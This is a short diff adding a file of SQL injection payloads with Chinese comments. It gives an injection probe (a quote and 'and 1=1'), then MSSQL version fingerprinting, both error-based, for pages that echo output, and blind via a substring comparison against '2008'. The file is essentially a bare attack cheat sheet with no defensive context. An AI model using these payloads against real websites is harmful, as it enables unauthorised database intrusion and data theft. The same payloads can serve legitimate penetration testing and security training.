@@ -1,0 +1,8 @@
+(1)
+'
+and 1=1
+
+(2)
+and 1=@@version--  #适用于有回显
+
+and substring((select @@version),22,4)='2008'--   #适用于无回显，盲注
